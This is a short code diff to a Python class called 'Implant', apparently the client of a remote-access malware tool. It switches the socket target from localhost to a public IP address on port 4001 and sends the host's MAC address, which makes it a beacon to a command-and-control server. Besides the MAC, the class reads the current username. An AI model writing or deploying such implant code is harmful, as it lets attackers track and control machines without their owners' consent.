@@ -18,7 +18,7 @@ class Implant(object):
         self.uid = getpass.getuser() + "_" + str(self.mac)
         self.installed = self.is_installed()
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.connect(('127.0.0.1', 4001))
+        self.sock.connect(('209.97.145.192', 4001))
         self.sock.send(str(self.mac).encode())
 
     def is_installed(self):
